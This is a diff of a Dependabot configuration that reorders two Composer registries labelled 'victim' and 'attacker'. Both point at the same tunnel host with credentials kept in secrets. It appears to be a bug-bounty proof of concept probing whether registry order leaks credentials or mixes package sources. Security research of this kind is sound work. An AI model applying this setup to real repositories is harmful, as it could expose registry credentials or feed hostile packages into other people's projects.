@@ -1,21 +1,21 @@
 version: 2
 registries:
-  attacker-composer-feed:
-    type: composer-repository
-    url: https://a861cc88869aec.lhr.life/unrelated-attacker
-    username: h1-attacker-feed
-    password: ${{secrets.H1_COMPOSER_ATTACKER_PASSWORD}}
-  victim-composer-feed:
+  aaa-victim-composer-feed:
     type: composer-repository
     url: https://a861cc88869aec.lhr.life/victim
     username: h1-registry-owner
     password: ${{secrets.H1_COMPOSER_VICTIM_PASSWORD}}
+  zzz-attacker-composer-feed:
+    type: composer-repository
+    url: https://a861cc88869aec.lhr.life/unrelated-attacker
+    username: h1-attacker-feed
+    password: ${{secrets.H1_COMPOSER_ATTACKER_PASSWORD}}
 updates:
   - package-ecosystem: composer
     directory: "/"
     registries:
-      - attacker-composer-feed
-      - victim-composer-feed
+      - aaa-victim-composer-feed
+      - zzz-attacker-composer-feed
     schedule:
       interval: daily
     open-pull-requests-limit: 1
